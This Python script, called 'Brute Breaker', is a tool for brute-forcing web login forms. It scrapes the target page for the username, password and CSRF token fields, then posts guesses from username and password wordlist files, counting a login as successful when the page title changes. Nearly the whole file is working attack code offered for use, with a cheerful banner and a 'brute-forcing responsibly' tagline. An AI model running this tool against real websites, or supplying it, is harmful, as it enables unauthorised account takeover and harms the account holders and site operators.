import time
import os
import sys
import requests
import re
from bs4 import BeautifulSoup

# Typing effect for text output
def type_effect(text, delay=0.05, color="\033[1;32m"):
    for char in text:
        sys.stdout.write(f"{color}{char}\033[0m")
        sys.stdout.flush()
        time.sleep(delay)
    print()

def type_colorful(text, color="\033[1;32m"):
    print(f"{color}{text}\033[0m")

# Spinner loader
def spinner(duration=3, message="Loading"):
    spinner_chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    end_time = time.time() + duration
    while time.time() < end_time:
        for char in spinner_chars:
            sys.stdout.write(f"\r{message} {char} ")
            sys.stdout.flush()
            time.sleep(0.1)
    print("\n")

# Banner display
def display_banner():
    banner = """
 /$$$$$$$                        /$$
| $$__  $$                      | $$
| $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$
| $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   /$$__  $$
| $$__  $$| $$  \__/| $$  | $$  | $$    | $$$$$$$$
| $$  \ $$| $$      | $$  | $$  | $$ /$$| $$_____/
| $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$
|_______/ |__/       \______/    \___/   \_______/


 /$$$$$$$                                /$$
| $$__  $$                              | $$
| $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$ | $$   /$$  /$$$$$$   /$$$$$$
| $$$$$$$  /$$__  $$ /$$__  $$ |____  $$| $$  /$$/ /$$__  $$ /$$__  $$
| $$__  $$| $$  \__/| $$$$$$$$  /$$$$$$$| $$$$$$/ | $$$$$$$$| $$  \__/
| $$  \ $$| $$      | $$_____/ /$$__  $$| $$_  $$ | $$_____/| $$
| $$$$$$$/| $$      |  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$| $$
|_______/ |__/       \_______/ \_______/|__/  \__/ \_______/|__/

    """
    print("\033[1;34m" + banner + "\033[0m")

# Progress bar
def progress_bar(duration=3, bar_length=30):
    for i in range(bar_length + 1):
        percent = (i / bar_length) * 100
        bar = "\033[1;32m" + "#" * i + "\033[0m" + "-" * (bar_length - i)
        sys.stdout.write(f"\r[{bar}] {percent:.1f}%")
        sys.stdout.flush()
        time.sleep(duration / bar_length)
    print("\n")

# Intro sequence
def tool_intro():
    os.system("clear")
    type_effect("Welcome to Brute Breaker: The Ultimate Brute Force Tool!", color="\033[1;36m")
    type_effect("Author: sujeet_0x01\n", color="\033[1;33m")
    spinner(message="Initializing")
    display_banner()
    type_effect("\nStarting up brute force engine...", color="\033[1;31m")
    progress_bar()
    type_effect("All systems are ready. Happy brute-forcing responsibly!", color="\033[1;32m")
    type_colorful("\n____________________________________________________________", color="\033[1;33m")


def analyze_source(source_code):
    # Parse the HTML source code
    soup = BeautifulSoup(source_code, "html.parser")
    input_fields = soup.find_all("input")

    data = {}

    # Check input field attributes
    for field in input_fields:
        field_name = field.get("name", "").lower()
        field_id = field.get("id", "").lower()
        field_type = field.get("type", "").lower()
        field_value = field.get("value","").lower()

        
        # Check for username fields
        if re.search(r'\b(username|user|email|login|id)\b', field_name) or \
           re.search(r'\b(username|user|email|login|id|user_login)\b', field_id):
            usernames = field_name
            type_effect(f"\nUSERNAME FIELD - [+]SUCCESSFUL", color="\033[1;32m")

        # Check for password fields
        if field_type == "password" or re.search(r'\b(password|pass|pwd)\b', field_name) or \
           re.search(r'\b(password|pass|pwd|user_pass)\b', field_id):
            passwords = field_name
            type_effect(f"\nPASSWORD FIELD - [+]SUCCESSFUL", color="\033[1;32m")

        if field_type == "checkbox":
            continue

        if field_name == "":
            continue

        if field_type == "hidden":
            token_name = set(field_name)
            refrence_set = set("token")
            if  refrence_set.issubset(token_name) == True:
                token_av = True

                login_page = session.get(login_url)
                soup = BeautifulSoup(login_page.text, "html.parser")

                token = field_name  # Assign the detected token field name
                token_input = soup.find("input", {"name": token})
                if token_input and "value" in token_input.attrs:
                    csrf_token = token_input["value"]
                    data[token] = csrf_token
                    type_colorful(f"\nTOKEN - {csrf_token}", color="\033[1;32m")
                    continue
                else:
                    type_colorful(f"Token Not Found", color="\033[1;33m")
                    continue

        data[field_name] = field_value
    return data, usernames, passwords

# Brute force function
def brute_force(login_data, username_field, password_field, login_url, file_path, username,title):
    type_effect(f"\nTRYING PASSWORD FOR - {username}", color="\033[1;33m")
    type_colorful(f"\nLogin Payload -  {login_data}", color="\033[1;36m")
    with open(file_path, "r") as file:
        for password in file:
            password = password.strip()
            login_payload = login_data.copy()
            login_payload[username_field] = username
            login_payload[password_field] = password

            headers = {"User-Agent": "Mozilla/5.0", "Referer": login_url}
            response = session.post(login_url, data=login_payload, headers=headers)

            soup = BeautifulSoup(response.text, "html.parser")
            av_title = soup.title.string
            if title != av_title:  # Adjust to website behavior
                type_effect(f"\nPassword Found[+] {password}", color="\033[1;32m")
                break
            else:
                type_colorful(f"Password Tried[-] {password}", color="\033[1;33m")

# Main execution
tool_intro()

type_effect("Ex. https://example.com/login\nEnter URL:", color="\033[1;32m")
url = input("=> ").strip()
session = requests.Session()

page = session.get(url)
soup = BeautifulSoup(page.text, "html.parser")

try:

    try:
        login_url = soup.find("form", {"method":"post"})["action"]

    except TypeError:                                                            
        login_url = soup.find("form", {"method":"POST"})["action"]

    parts = url.split('/')
    org_url = "/".join(parts[:3])

except Exception as e:
    type_effect(f"Error retrieving login URL: {e}", color="\033[1;31m")
    sys.exit(1)
#   TO CHECK LOGIN POST URL AND CREATE PERFECT LOGIN POST URL

if org_url[:len(org_url)] == login_url[:len(org_url)]:
    type_effect(f"\nPOST URL - [+]SUCCESSFUL", color="\033[1;32m")

else:
    login_url = org_url+login_url
    type_effect(f"\nPOST URL - [+]SUCCESSFUL", color="\033[1;32m")

login_page = session.get(login_url)
soup = BeautifulSoup(login_page.text, "html.parser")
title = soup.title.string

login_data, username_field, password_field = analyze_source(page.text)


type_effect("\nDo you have a username file?", color="\033[1;33m")
has_file = input("Yes or No: ").strip().lower()

if has_file == "yes":
    username_file = input("Enter username file path: ").strip()
    password_file = input("Enter password file path: ").strip()
    with open(username_file, "r") as user_file:
        for username in user_file:
            username = username.strip()
            brute_force(login_data, username_field, password_field, login_url, password_file, username,title)
else:
    username = input("Enter a single username: ").strip()
    password_file = input("Enter password file path: ").strip()
    brute_force(login_data, username_field, password_field, login_url, password_file, username,title)
